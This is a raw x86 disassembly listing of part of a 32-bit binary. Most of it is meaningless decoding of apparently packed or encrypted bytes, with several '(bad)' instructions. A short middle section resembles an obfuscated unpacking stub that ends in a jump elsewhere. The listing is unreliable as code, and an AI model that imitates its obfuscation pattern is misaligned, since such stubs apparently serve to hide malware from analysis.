  40d834:	add    DWORD PTR [esi-0x24],0x32
  40d838:	add    BYTE PTR [ecx-0x31],0x68
  40d83c:	jge    0x40d830
  40d83e:	push   esp
  40d83f:	sbb    ecx,esp
  40d841:	add    eax,0x4defe5c6
  40d846:	ds mov bh,0x87
  40d849:	aad    0x89
  40d84b:	in     eax,dx
  40d84c:	push   0xe
  40d84e:	fs jle 0x40d859
  40d851:	scas   ax,WORD PTR es:[edi]
  40d853:	mov    eax,ds:0x76ab4a0a
  40d858:	shl    DWORD PTR [eax+ebp*2-0x3b8a22d3],0xea
  40d860:	shl    DWORD PTR [ebx+edi*2-0x3b],0xb2
  40d865:	les    ebx,FWORD PTR [ebx]
  40d867:	xor    ecx,DWORD PTR [ebx]
  40d869:	sbb    DWORD PTR [esi-0x6c],0xf8e0de47
  40d870:	mov    ebx,0xcb67ce73
  40d875:	push   0x5c
  40d877:	mov    ds:0x6ef34c5a,al
  40d87c:	fisub  DWORD PTR [edi+0x4c]
  40d87f:	outs   dx,DWORD PTR ds:[esi]
  40d880:	add    BYTE PTR [ebx+0xff2c178],bl
  40d886:	es retf 0xf4e1
  40d88a:	cmp    eax,0x9698862
  40d88f:	(bad)  
  40d890:	leave  
  40d891:	dec    eax
  40d892:	das    
  40d893:	(bad)  
  40d896:	push   edx
  40d897:	mov    eax,ds:0xf984f1d1
  40d89c:	sbb    al,0x92
  40d89e:	imul   edx,ebp,0x54c02216
  40d8a4:	retf   
  40d8a5:	xchg   esp,eax
  40d8a6:	dec    ebp
  40d8a7:	fidivr DWORD PTR [ecx+eax*2-0x22]
  40d8ab:	clc    
  40d8ac:	or     al,0x32
  40d8ae:	push   esp
  40d8af:	ficom  WORD PTR [ebx+0x1c68585b]
  40d8b5:	adc    ebp,DWORD PTR [ebp+eax*2+0x43]
  40d8b9:	jns    0x40d853
  40d8bb:	adc    al,0xd8
  40d8bd:	ss mov ecx,0x9df2d180
  40d8c3:	mov    esi,0x9a931227
  40d8c8:	inc    esi
  40d8c9:	or     dl,0xe5
  40d8cc:	fwait
  40d8cd:	adc    eax,DWORD PTR ds:0x692c6c32
  40d8d3:	xchg   ebx,eax
  40d8d4:	mov    ch,0x95
  40d8d6:	enter  0xabf1,0x40
  40d8da:	xor    DWORD PTR [ebx+0x431e43a3],esi
  40d8e0:	std    
  40d8e1:	daa    
  40d8e2:	mov    cl,0x37
  40d8e4:	mul    ecx
  40d8e6:	inc    edi
  40d8e7:	das    
  40d8e8:	sub    ah,al
  40d8ea:	or     al,0x4d
  40d8ec:	dec    esi
  40d8ed:	pushf  
  40d8ee:	or     DWORD PTR [edx+0x60],esp
  40d8f1:	neg    BYTE PTR ds:0x12e895bd
  40d8f7:	mov    eax,ecx
  40d8f9:	mov    BYTE PTR [eax],ch
  40d8fb:	jnp    0x40d8eb
  40d8fd:	cs aad 0x92
  40d900:	fwait
  40d901:	(bad)  
  40d902:	pop    esi
  40d903:	mov    esi,0xb21187d1
  40d908:	and    BYTE PTR [ecx-0x36],bh
  40d90b:	dec    ecx
  40d90c:	lahf   
  40d90d:	bound  esp,QWORD PTR [ecx-0x4d0818f0]
  40d913:	ins    DWORD PTR es:[edi],dx
  40d914:	js     0x40d8a6
  40d916:	out    dx,eax
  40d917:	aaa    
  40d918:	test   al,0xde
  40d91a:	ret    
  40d91b:	xor    dl,BYTE PTR [eax-0x39]
  40d91e:	add    BYTE PTR [eax+0x15],0x2f
  40d922:	or     BYTE PTR ds:0x18b05086,bh
  40d928:	test   BYTE PTR [eax+0x7b],bl
  40d92b:	mov    edi,0xc256aab3
  40d930:	dec    edi
  40d931:	daa    
  40d932:	pop    ebx
  40d933:	mov    al,ds:0x975d9d29
  40d938:	jmp    0x40d963
  40d93a:	sar    BYTE PTR [ecx+esi*4],1
  40d93d:	lods   al,BYTE PTR es:[esi]
  40d93f:	pop    ecx
  40d940:	jmp    0x44ce:0x3e8aabe2
  40d947:	and    DWORD PTR [edx+ecx*1],edx
  40d94a:	xlat   BYTE PTR ds:[ebx]
  40d94b:	fsub   DWORD PTR [eax-0x1d]
  40d94e:	test   al,0x45
  40d950:	push   eax
  40d951:	ret    
  40d952:	inc    ebp
  40d953:	aad    0x23
  40d955:	xchg   BYTE PTR [bx+si],ch
  40d958:	add    BYTE PTR [edx+0x3ddc987a],dl
  40d95e:	sbb    al,0x1a
  40d960:	sub    BYTE PTR [edi-0x1f],bl
  40d963:	icebp  
  40d964:	mov    dl,0xe1
  40d966:	pusha  
  40d967:	push   esi
  40d968:	pop    ds
  40d969:	call   0xfe738e1c
  40d96e:	mov    esi,0x3c355fe3
  40d973:	pop    ss
  40d974:	inc    edi
  40d975:	xchg   ecx,eax
  40d976:	xchg   ebx,eax
  40d977:	push   0x7a9a3709
  40d97c:	inc    eax
  40d97d:	xchg   edx,eax
  40d97e:	cmp    DWORD PTR [ebp-0x5b0ceb4f],ebp
  40d984:	arpl   WORD PTR [esp+eax*8-0x42e5ea5e],ax
  40d98b:	fsubr  QWORD PTR [ebp+esi*8-0x40]
  40d98f:	loop   0x40d9ce
  40d991:	ins    BYTE PTR es:[edi],dx
  40d992:	dec    esi
  40d993:	inc    edx
  40d994:	scas   al,BYTE PTR es:[edi]
  40d995:	lea    ebp,[esi]
  40d997:	adc    eax,0x5d895456
  40d99c:	jmp    0x40d94b
  40d99e:	xor    al,0x41
  40d9a0:	cmp    esi,ecx
  40d9a2:	inc    esi
  40d9a3:	adc    ah,ch
  40d9a5:	scas   al,BYTE PTR es:[edi]
  40d9a6:	stos   BYTE PTR es:[edi],al
  40d9a7:	icebp  
  40d9a8:	jl     0x40d95e
  40d9aa:	sbb    ebp,eax
  40d9ac:	mov    bl,0xd0
  40d9ae:	cwde   
  40d9af:	loope  0x40d9dd
  40d9b1:	mov    esp,0xed4474ac
  40d9b6:	aam    0xb7
  40d9b8:	xor    DWORD PTR [ecx],edx
  40d9ba:	sbb    al,0x86
  40d9bc:	(bad)  [edi]
  40d9be:	hlt    
  40d9bf:	retf   0xa47e
  40d9c2:	jmp    0x40d96d
  40d9c4:	mov    dh,0xe8
  40d9c6:	shld   DWORD PTR [ecx-0x76],esp,cl
  40d9ca:	push   es
  40d9cb:	jg     0x40da10
  40d9cd:	sub    eax,0xf8b9d1a3
  40d9d2:	(bad)  
  40d9d3:	mov    ah,0xe0
  40d9d5:	jmp    0x19bc:0x2cfe7d9f
  40d9dc:	inc    esp
  40d9dd:	bound  eax,QWORD PTR [ebx-0x69997755]
  40d9e3:	or     bl,BYTE PTR [ecx]
  40d9e5:	mov    ebp,0x7d2b9958
  40d9ea:	mov    ?,eax
  40d9ec:	cli    
  40d9ed:	mov    dh,0xb8
  40d9ef:	jmp    0x40d9b2
  40d9f1:	cmp    edx,ebx
  40d9f3:	mov    ds:0x25545e3a,eax
  40d9f8:	and    esi,edx
  40d9fa:	dec    ecx
  40d9fb:	pushw  ds
  40d9fd:	mov    ds,WORD PTR [edx+0x4bea5c28]
  40da03:	mov    cl,0xaf
  40da05:	mov    ds:0xfbfd56df,al
  40da0a:	imul   esi,DWORD PTR [ebx+0x7d637936],0xffffffcf
  40da11:	add    esi,esi
  40da13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da14:	pop    ss
  40da15:	sub    dl,BYTE PTR [ecx+0x5c]
  40da18:	sbb    BYTE PTR [edi-0x70cf76d],al
  40da1e:	mov    al,0x9
  40da20:	xchg   ebx,eax
  40da21:	test   DWORD PTR [ecx+ebx*2-0x23246b21],esi
  40da28:	dec    esi
  40da29:	xchg   ebx,eax
  40da2a:	add    BYTE PTR [ebp+0x54],dl
  40da2d:	shl    BYTE PTR [ebp+0x6d52f337],1
  40da33:	inc    ebp
  40da34:	outs   dx,DWORD PTR ds:[esi]
  40da35:	jmp    0xa1c60db7
  40da3a:	shr    BYTE PTR [edi-0x1c1dd2bf],0x3
  40da41:	inc    edi
  40da42:	shr    ah,1
  40da44:	jecxz  0x40dab0
  40da46:	addr16 loope 0x40da34
  40da49:	adc    bh,0x47
  40da4c:	out    dx,eax
  40da4d:	push   ebx
  40da4e:	jbe    0x40da17
  40da50:	int    0x78
  40da52:	inc    ebp
  40da53:	rcr    DWORD PTR [edx+esi*8-0x66],0x53
  40da58:	push   edi
  40da59:	repz sub al,0xb6
  40da5c:	es add esp,esp
  40da5f:	fnstsw WORD PTR [eax]
  40da61:	jmp    0x40da3c
  40da63:	fnstcw WORD PTR [ebx+eax*4+0x2f]
  40da67:	mov    esp,0x78c1773
  40da6c:	jnp    0x40dab1
  40da6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da6f:	or     ah,0x2a
  40da72:	cli    
  40da73:	mov    ds:0x59784932,al
  40da78:	dec    ebp
  40da79:	and    eax,0xe337fffd
  40da7e:	pop    eax
  40da7f:	or     eax,0xe82e74eb
  40da84:	cs cli 
  40da86:	aam    0x75
  40da88:	cld    
  40da89:	or     al,0x5e
  40da8b:	imul   eax,ebp,0x3a
  40da8e:	inc    eax
  40da8f:	push   ebx
  40da90:	loop   0x40da74
  40da92:	mov    cs,WORD PTR [eax]
  40da94:	shr    ebp,1
  40da96:	outs   dx,BYTE PTR ds:[esi]
  40da97:	in     al,0x56
  40da99:	inc    esi
  40da9a:	add    ecx,DWORD PTR [ecx-0x16]
  40da9d:	mov    cs,WORD PTR [ebx-0x5ba93cea]
  40daa3:	retf   0x599d
  40daa6:	inc    ebp
  40daa7:	daa    
  40daa8:	lods   eax,DWORD PTR ds:[esi]
  40daa9:	pop    esi
  40daaa:	ret    0xd32c
  40daad:	popa   
  40daae:	adc    cl,ch
  40dab0:	mov    ds:0x935160bb,eax
  40dab5:	adc    BYTE PTR [ecx+0x78f0064],ah
  40dabb:	fwait
  40dabc:	outs   dx,BYTE PTR ds:[esi]
  40dabd:	jecxz  0x40da6d
  40dabf:	cmp    eax,0x83d60c89
  40dac4:	test   BYTE PTR [edi+0x4f],0x97
  40dac8:	cli    
  40dac9:	pop    esp
  40daca:	imul   eax,esi,0x495c711a
  40dad0:	ror    DWORD PTR [edi+0x548dbacc],cl
  40dad6:	pop    ds
  40dad7:	cwde   
  40dad8:	arpl   WORD PTR [ecx+0x37],bx
  40dadb:	cmp    bh,bl
  40dadd:	sub    bh,BYTE PTR [ebp+0x18997685]
  40dae3:	xor    eax,0x529f4ca1
  40dae8:	mov    ch,0x62
  40daea:	cmc    
  40daeb:	sahf   
  40daec:	lds    edx,FWORD PTR [ecx]
  40daee:	xor    BYTE PTR [esi+0x5af60206],al
  40daf4:	inc    ecx
  40daf5:	lods   al,BYTE PTR ds:[esi]
  40daf6:	push   cs
  40daf7:	cmp    BYTE PTR [edx-0x5b96222b],bl
  40dafd:	aas    
  40dafe:	mov    al,BYTE PTR [ebx]
  40db00:	mov    ds:0x5249edb,al
  40db05:	stos   DWORD PTR es:[edi],eax
  40db06:	imul   esi,DWORD PTR [edi-0x7d232505],0xfffffff1
  40db0d:	mov    bh,0xd4
  40db0f:	fidiv  WORD PTR [ebx]
  40db11:	int    0xb2
  40db13:	push   es
  40db14:	jg     0x40dae2
  40db16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db17:	and    dh,ch
  40db19:	push   cs
  40db1a:	dec    ebx
  40db1b:	je     0x40db3f
  40db1d:	pop    ebx
  40db1e:	push   esi
  40db1f:	sbb    BYTE PTR ds:0xf0356fe7,dh
  40db25:	adc    cl,BYTE PTR [ebx-0x3c]
  40db28:	mov    dh,0xd9
  40db2a:	and    al,0xff
  40db2c:	jecxz  0x40db6b
  40db2e:	bound  ecx,QWORD PTR [edx]
  40db30:	in     eax,dx
  40db31:	pop    ebp
  40db32:	push   esp
  40db33:	or     esi,DWORD PTR [esi]
  40db35:	outs   dx,BYTE PTR ds:[esi]
  40db36:	xchg   esp,eax
  40db37:	or     eax,0xcaa5be93
  40db3c:	lea    esi,[edi]
  40db3e:	in     al,dx
  40db3f:	add    cl,cl
  40db41:	adc    ebp,DWORD PTR [edx-0x66]
  40db44:	or     ecx,DWORD PTR [edx]
  40db46:	ret    
  40db47:	jno    0x40db9e
  40db49:	jb     0x40db42
  40db4b:	xchg   esi,eax
  40db4c:	or     eax,0xfdd87363
  40db51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db52:	in     eax,0x52
  40db54:	sub    ecx,esp
  40db56:	mov    esp,cs
  40db58:	je     0x40db8d
  40db5a:	daa    
  40db5b:	adc    edx,DWORD PTR [esp+ebx*8+0x2e]
  40db5f:	jns    0x40dba0
  40db61:	dec    esp
  40db62:	stc    
  40db63:	call   0xa4d4:0xfbbd6e0a
  40db6a:	push   0x5853a06d
  40db6f:	xor    eax,0x48700cb6
  40db74:	(bad)  
  40db75:	push   ecx
  40db76:	or     BYTE PTR ds:0x78a567d4,0x2c
  40db7d:	jbe    0x40db9f
  40db7f:	jp     0x40db1f
  40db81:	inc    ebp
  40db82:	bound  edx,QWORD PTR [ebp-0x3cb3dcd3]
  40db88:	jae    0x40db4a
  40db8a:	xor    DWORD PTR [ebx],esp
  40db8c:	add    bl,BYTE PTR [edi+0x7538f1a8]
  40db92:	sub    ecx,DWORD PTR [edi]
  40db94:	inc    esi
  40db95:	sub    dl,BYTE PTR [edx+0x7f]
  40db98:	mov    eax,ds:0xed8ffede
  40db9d:	cmp    esi,DWORD PTR [esi+0x35fc184f]
  40dba3:	adc    eax,0xf3ff0072
  40dba8:	or     bl,ch
  40dbaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbab:	mov    edx,ecx
  40dbad:	jne    0x40db42
  40dbaf:	xchg   DWORD PTR [ecx],ebx
  40dbb1:	mov    edi,ecx
  40dbb3:	mov    ebp,0xa6f5807e
  40dbb8:	cmovns ebp,DWORD PTR [edx]
  40dbbb:	ret    
  40dbbc:	cmc    
  40dbbd:	popa   
  40dbbe:	fwait
  40dbbf:	push   edi
  40dbc0:	lods   eax,DWORD PTR ds:[esi]
  40dbc1:	inc    esp
  40dbc2:	loop   0x40dbec
  40dbc4:	bound  ebx,QWORD PTR [ebx+0x5f5f6c18]
  40dbca:	pushf  
  40dbcb:	mov    dh,BYTE PTR [eax-0x558b744e]
  40dbd1:	mov    edi,esi
  40dbd3:	pop    es
  40dbd4:	out    0x61,al
  40dbd6:	add    DWORD PTR [ebp+0x10],ebx
  40dbd9:	add    BYTE PTR [eax],0xb5
  40dbdc:	or     ch,BYTE PTR [esi-0x244abd87]
  40dbe2:	sbb    al,BYTE PTR [ecx+eiz*8-0x34]
  40dbe6:	repz jmp 0x40db9b
  40dbe9:	ret    0xa8e9
  40dbec:	dec    esi
  40dbed:	and    eax,DWORD PTR [esi+eiz*2]
  40dbf0:	mov    ds:0x3fa3eab0,al
  40dbf5:	xchg   edi,eax
  40dbf6:	mov    esp,0xaecf7302
  40dbfb:	mov    bl,0x99
  40dbfd:	int    0xe7
  40dbff:	mov    al,ds:0x7e469e5d
  40dc04:	ins    DWORD PTR es:[edi],dx
  40dc05:	ror    DWORD PTR [ecx-0x5c],1
  40dc08:	push   ebx
  40dc09:	rol    DWORD PTR [esi],0xfd
  40dc0c:	out    0x86,eax
  40dc0e:	ins    DWORD PTR es:[edi],dx
  40dc0f:	lock ins BYTE PTR es:[edi],dx
  40dc11:	lds    eax,FWORD PTR [edi-0x14901aa4]
  40dc17:	and    eax,0xe6282a28
  40dc1c:	in     al,dx
  40dc1d:	ret    
  40dc1e:	jp     0x40dc38
  40dc20:	jecxz  0x40dc51
  40dc22:	loope  0x40dbce
  40dc24:	cli    
  40dc25:	sbb    eax,0x63fb0133
  40dc2a:	clc    
  40dc2b:	jmp    0x93eb84a0
  40dc30:	pusha  
  40dc31:	and    edi,DWORD PTR [esi+0x18362932]
  40dc37:	jmp    0xce5e:0x24a1cc09
  40dc3e:	retf   0x2096
  40dc41:	cmp    ebx,ebx
  40dc43:	stos   BYTE PTR es:[edi],al
  40dc44:	xchg   ecx,eax
  40dc45:	in     eax,dx
  40dc46:	jns    0x40dc7f
  40dc48:	push   edi
  40dc49:	lock scas al,BYTE PTR es:[edi]
  40dc4b:	xchg   esi,eax
  40dc4c:	cwde   
  40dc4d:	test   eax,0x9d6d9a3d
  40dc52:	sub    ebx,edi
  40dc54:	inc    esi
  40dc55:	mov    esi,?
  40dc57:	cld    
  40dc58:	push   ds
  40dc59:	jle    0x40dbe1
  40dc5b:	add    eax,0x21dfa0dc
  40dc60:	(bad)  
  40dc61:	loop   0x40dc03
  40dc63:	mov    WORD PTR [ebp-0x64b9a95],cs
  40dc69:	dec    eax
  40dc6a:	rol    DWORD PTR [eax-0x32f30fc9],0x55
  40dc71:	xchg   edx,eax
  40dc72:	add    DWORD PTR [esi-0x7e],esp
  40dc75:	mov    edi,0x81baf33b
  40dc7a:	cmp    al,0x41
  40dc7c:	mov    al,ds:0x22a4768d
  40dc81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc82:	in     al,0x5c
  40dc84:	out    0xc6,eax
  40dc86:	int    0xb4
  40dc88:	adc    al,0xaf
  40dc8a:	fstp   QWORD PTR [eax+0xc70cc1e]
  40dc90:	mov    al,0x77
  40dc92:	ret    
  40dc93:	push   cs
  40dc94:	test   al,0x72
  40dc96:	xor    edi,DWORD PTR [ebx+eiz*1-0x34]
  40dc9a:	sbb    bl,BYTE PTR [eax+ecx*2]
  40dc9d:	lahf   
  40dc9e:	jle    0x40dd13
  40dca0:	ror    edx,1
  40dca2:	in     al,0x96
  40dca4:	pop    es
  40dca5:	fiadd  DWORD PTR [eax]
  40dca7:	mov    dl,0x81
  40dca9:	fstp   QWORD PTR ds:0x2bd3f684
  40dcaf:	jbe    0x40dc8b
  40dcb1:	adc    dh,BYTE PTR [edi]
  40dcb3:	js     0x40dcfa
  40dcb5:	sahf   
  40dcb6:	pop    ds
  40dcb7:	or     BYTE PTR [ecx],ch
  40dcb9:	push   edx
  40dcba:	out    0xd3,al
  40dcbc:	in     eax,0x5e
  40dcbe:	in     al,dx
  40dcbf:	call   0x6d3e:0xbd0de156
  40dcc6:	cmp    BYTE PTR [ecx-0x5064498d],0xcc
  40dccd:	pop    ebx
  40dcce:	push   edi
  40dccf:	ret    0x8661
  40dcd2:	sub    al,0xde
  40dcd4:	stos   BYTE PTR es:[edi],al
  40dcd5:	jmp    0x9bf2:0xe55edf12
  40dcdc:	fld    DWORD PTR [edi+0x3]
  40dcdf:	dec    edi
  40dce0:	pop    ecx
  40dce1:	js     0x40dd4d
  40dce3:	jo     0x40dd3b
  40dce5:	sbb    eax,0x59bb9614
  40dcea:	stos   BYTE PTR es:[edi],al
  40dceb:	mov    al,BYTE PTR [eax+0x6b]
  40dcee:	sets   BYTE PTR [esi-0x55dac230]
  40dcf5:	sbb    eax,0xb9716187
  40dcfa:	or     al,0xe4
  40dcfc:	adc    eax,0x6f1abde2
  40dd01:	mov    bl,0x69
  40dd03:	and    bh,ah
  40dd05:	test   dl,bh
  40dd07:	or     DWORD PTR [ecx],ecx
  40dd09:	outs   dx,BYTE PTR ds:[esi]
  40dd0a:	clc    
  40dd0b:	fst    QWORD PTR [edi+0x53]
  40dd0e:	xor    ecx,ecx
  40dd10:	or     al,0xa2
  40dd12:	sbb    al,0x1b
  40dd14:	pmulhw mm1,mm3
  40dd17:	lahf   
  40dd18:	lods   al,BYTE PTR ds:[esi]
  40dd19:	push   ss
  40dd1a:	sbb    DWORD PTR es:[ecx+0x6c59e8e7],eax
  40dd21:	ror    BYTE PTR [esi-0x39ee4606],cl
  40dd27:	push   ds
  40dd28:	mov    esi,0xc8b5208a
  40dd2d:	pop    ss
  40dd2e:	add    ch,BYTE PTR [edx+0x5]
  40dd31:	push   ebp
  40dd32:	nop
  40dd33:	xchg   ebp,eax
  40dd34:	loope  0x40dd6d
  40dd36:	daa    
  40dd37:	jbe    0x40dcdd
  40dd39:	push   0xaebf0724
  40dd3e:	mov    ds,WORD PTR [ebp+0x6a26babf]
  40dd44:	or     bh,ch
  40dd46:	xor    al,0x9b
  40dd48:	push   edx
  40dd49:	pop    ss
  40dd4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd4b:	ror    cl,1
  40dd4d:	sub    DWORD PTR [eax-0x26],edi
  40dd50:	stos   DWORD PTR es:[edi],eax
  40dd51:	ficomp WORD PTR [eax+ebx*8+0x63]
  40dd55:	push   0xccd6c3a4
  40dd5a:	push   es
  40dd5b:	dec    eax
  40dd5c:	aad    0x96
  40dd5e:	ret    
  40dd5f:	lea    ebp,[eax-0x2d]
  40dd62:	loope  0x40ddc6
  40dd64:	and    eax,0x8cc98189
  40dd69:	pop    es
  40dd6a:	lds    ebp,FWORD PTR [edx]
  40dd6c:	fild   WORD PTR [esi-0x17775141]
  40dd72:	add    ch,BYTE PTR [ebx-0x23df7494]
  40dd78:	xor    BYTE PTR [ebp+0x2d2d35b8],dh
  40dd7e:	adc    al,0x7a
  40dd80:	xor    al,0xff
  40dd82:	inc    edi
  40dd83:	sub    eax,0xe5c8bc43
  40dd88:	mov    ds:0x3d7c1394,al
  40dd8d:	cmp    ecx,DWORD PTR [edi+0xb]
  40dd90:	imul   edi,ebp,0xa
  40dd93:	pop    edi
  40dd94:	repz dec esi
  40dd96:	jmp    DWORD PTR [eax-0x8]
  40dd99:	or     esp,DWORD PTR [esi+0x55]
  40dd9c:	jmp    0x4473:0x19aa05f5
  40dda3:	retf   0x21ad
  40dda6:	out    dx,eax
  40dda7:	ret    0xe07c
  40ddaa:	mov    edx,0x32b2ce0f
  40ddaf:	adc    BYTE PTR [esi-0x911774],0x57
  40ddb6:	gs or  ecx,edi
  40ddb9:	pushf  
  40ddba:	mov    WORD PTR [ebx+0x220c53b7],?
  40ddc0:	add    ah,BYTE PTR [esi+ebp*8-0x6]
  40ddc4:	mov    dh,BYTE PTR [eax+edx*4-0x1da401eb]
  40ddcb:	test   ebx,esi
  40ddcd:	sub    DWORD PTR [ecx],ebp
  40ddcf:	fcomp  QWORD PTR [ebp+0x30]
  40ddd2:	popf   
  40ddd3:	sbb    BYTE PTR [edi+0x1b],dl
  40ddd6:	dec    esp
  40ddd7:	sti    
  40ddd8:	dec    ebx
  40ddd9:	bound  ebp,QWORD PTR [ebx]
  40dddb:	mov    edx,0x263fb26e
  40dde0:	cs mov edx,0x1b2dd631
  40dde6:	(bad)  
  40dde7:	enter  0x41cc,0xa7
  40ddeb:	lds    ebp,FWORD PTR [ecx]
  40dded:	inc    ebp
  40ddee:	pop    eax
  40ddef:	xor    DWORD PTR [ecx],0x46d4ec49
  40ddf5:	sub    BYTE PTR [ebp+0x72],bh
  40ddf8:	push   edi
  40ddf9:	mov    edx,0x705da269
  40ddfe:	mov    BYTE PTR [ecx+0x3cde8915],cl
  40de04:	idiv   eax
  40de06:	inc    ecx
  40de07:	mov    ebp,0xdaec961c
  40de0c:	lock or eax,0xf94ca4cd
  40de12:	out    0x66,al
  40de14:	add    al,0xe9
  40de16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de17:	pop    edi
  40de18:	jmp    0x40ddd7
  40de1a:	mov    ds:0x598a7683,eax
  40de1f:	cld    
  40de20:	das    
  40de21:	mov    ds:0x4e72d908,eax
  40de26:	or     ebx,0xfeeeab78
  40de2c:	call   0xcc39:0x59a90fdc
  40de33:	pop    ecx
  40de34:	popa   
  40de35:	push   0x3
  40de37:	or     DWORD PTR [edi+0x76],0xee263092
  40de3e:	mov    eax,0x9fcef66b
  40de43:	adc    edi,DWORD PTR [ecx-0x171d9aff]
  40de49:	lods   al,BYTE PTR ds:[esi]
  40de4a:	mov    cl,0xe6
  40de4c:	mov    eax,DWORD PTR [eax+0x458b3f92]
  40de52:	cld    
  40de53:	push   ebx
  40de54:	mov    DWORD PTR ds:0x42500c,0x32d4
  40de5e:	je     0x40deb5
  40de64:	or     DWORD PTR ds:0x427000,ecx
  40de6a:	mov    esi,DWORD PTR [ebp-0x18]
  40de6d:	mov    DWORD PTR ds:0x429000,0x1a4f
  40de77:	add    DWORD PTR [eax],esi
  40de79:	mov    eax,DWORD PTR [ebp-0x4]
  40de7c:	xor    esi,esi
  40de7e:	or     esi,DWORD PTR ds:0x428010
  40de84:	or     DWORD PTR ds:0x42600c,esi
  40de8a:	mov    esi,DWORD PTR [ebp+0xc]
  40de8d:	dec    DWORD PTR ds:0x428014
  40de93:	xor    esi,ecx
  40de95:	add    esi,edx
  40de97:	sub    DWORD PTR ds:0x426014,0x425028
  40dea1:	imul   esi,DWORD PTR [eax]
  40dea4:	mov    DWORD PTR ds:0x42701c,0x7c46
  40deae:	mov    DWORD PTR [eax],esi
  40deb0:	jmp    0x40dec4
  40deb5:	sub    DWORD PTR ds:0x427010,0x59d5
  40debf:	mov    esi,DWORD PTR [ebp+0x14]
  40dec2:	xor    DWORD PTR [eax],esi
  40dec4:	sub    esi,edi
  40dec6:	mov    eax,DWORD PTR [ebp-0x4]
  40dec9:	and    DWORD PTR ds:0x42801c,0x11ac
  40ded3:	mov    edi,DWORD PTR [ebp+0x10]
  40ded6:	add    ebx,esi
  40ded8:	xor    edi,ecx
  40deda:	or     DWORD PTR ds:0x429010,ebx
  40dee0:	mov    esi,0xffcd8d25
  40dee5:	dec    DWORD PTR ds:0x42801c
  40deeb:	mov    ebx,esi
  40deed:	sub    ebx,edi
  40deef:	add    DWORD PTR [eax],ebx
  40def1:	mov    DWORD PTR ds:0x425020,0x1c
  40defb:	cmp    DWORD PTR ds:0x425020,0x0
  40df02:	je     0x40df56
  40df08:	cmp    DWORD PTR ds:0x425020,0x9
  40df0f:	jne    0x40df28
  40df15:	push   DWORD PTR [ebp-0x28]
  40df18:	push   0x8d04
  40df1d:	push   0x4e0d
  40df22:	call   DWORD PTR ds:0x421020
  40df28:	cmp    DWORD PTR ds:0x425020,0xa
  40df2f:	jne    0x40df42
  40df35:	mov    edi,DWORD PTR ds:0x425020
  40df3b:	dec    edi
  40df3c:	mov    DWORD PTR ds:0x425020,edi
  40df42:	xor    edi,edi
  40df44:	xor    edi,DWORD PTR ds:0x425020
  40df4a:	dec    edi
  40df4b:	mov    DWORD PTR ds:0x425020,edi
  40df51:	jmp    0x40defb
  40df56:	mov    eax,DWORD PTR [ebp-0x4]
  40df59:	mov    edi,DWORD PTR [ebp-0x8]
  40df5c:	add    edi,DWORD PTR [eax]
  40df5e:	mov    DWORD PTR [ebp-0x8],edi
  40df61:	mov    eax,DWORD PTR [ebp+0xc]
  40df64:	mov    edi,DWORD PTR [ebp+0xc]
  40df67:	xor    edi,ecx
  40df69:	xor    eax,ecx
  40df6b:	lea    eax,[eax+edi*1+0x64e5b6]
  40df72:	mov    edi,DWORD PTR [ebp+0xc]
  40df75:	xor    edi,ecx
  40df77:	add    edi,edx
  40df79:	imul   eax,edi
  40df7c:	mov    edi,DWORD PTR [ebp+0xc]
  40df7f:	xor    edi,ecx
  40df81:	sub    edi,eax
  40df83:	mov    eax,DWORD PTR [ebp-0x4]
  40df86:	add    edi,edx
  40df88:	cmp    DWORD PTR [eax],edi
  40df8a:	mov    eax,DWORD PTR [ebp-0x4]
  40df8d:	mov    edi,DWORD PTR [ebp+0x10]
  40df90:	jg     0x40dfa3
  40df96:	xor    edi,ecx
  40df98:	mov    ebx,esi
  40df9a:	sub    ebx,edi
  40df9c:	add    DWORD PTR [eax],ebx
  40df9e:	jmp    0x40dfa9
  40dfa3:	xor    edi,ecx
  40dfa5:	add    edi,edx
  40dfa7:	add    DWORD PTR [eax],edi
  40dfa9:	mov    eax,DWORD PTR [ebp-0x8]
  40dfac:	mov    edi,DWORD PTR [ebp-0x10]
  40dfaf:	mov    eax,DWORD PTR [eax]
  40dfb1:	xor    edi,ecx
  40dfb3:	add    edi,0x3272da
  40dfb9:	not    edi
  40dfbb:	and    eax,edi
  40dfbd:	movsx  di,BYTE PTR [eax+0x1]
  40dfc2:	jmp    0x41036d
  40dfc7:	jge    0x40e029
  40dfc9:	xor    al,0x4e
  40dfcb:	xor    eax,DWORD PTR [esi]
  40dfcd:	add    ecx,DWORD PTR [edi-0x5e]
  40dfd0:	mov    dl,0x21
  40dfd2:	mov    al,0x65
  40dfd4:	xlat   BYTE PTR ds:[ebx]
  40dfd5:	mov    bl,0x40
  40dfd7:	(bad)
  40dfda:	(bad)  
  40dfdb:	hlt    
  40dfdc:	pop    edi
  40dfdd:	bound  esp,QWORD PTR [edx-0x2d]
  40dfe0:	push   ebp
  40dfe1:	push   ebx
  40dfe2:	xchg   esp,eax
  40dfe3:	fistp  DWORD PTR [ecx]
  40dfe5:	push   0x41
  40dfe7:	mov    al,0x6
  40dfe9:	and    eax,0xc033a8ff
  40dfee:	mov    DWORD PTR [edi+0x6cf6ccf8],ecx
  40dff4:	sbb    eax,0x8963c1ef
  40dff9:	add    esp,DWORD PTR [edx-0x231c1494]
  40dfff:	ds inc ebx
  40e001:	test   BYTE PTR [edx],cl
  40e003:	lock dec eax
  40e005:	xor    eax,0x723b7e80
  40e00a:	adc    ah,ch
  40e00c:	fld    QWORD PTR [esi+0x32bbfd8b]
  40e012:	cwde   
  40e013:	rcr    DWORD PTR [esi-0x2d],0xee
  40e017:	mov    ah,BYTE PTR [esp+edi*2]
  40e01a:	dec    DWORD PTR ds:0x7b609357
  40e020:	cmp    eax,0x915e12de
  40e025:	sub    BYTE PTR [ecx+0x34c39094],ah
  40e02b:	pop    eax
  40e02c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e02d:	cmp    eax,0x8470f9b3
  40e032:	adc    DWORD PTR [edi+0x22],0x7b41b756
  40e039:	sbb    esi,DWORD PTR [ebp-0x1]
  40e03c:	aad    0xbc
  40e03e:	fs pop eax
  40e040:	mov    eax,ds:0x319c0870
  40e045:	add    ecx,edx
  40e047:	inc    ebx
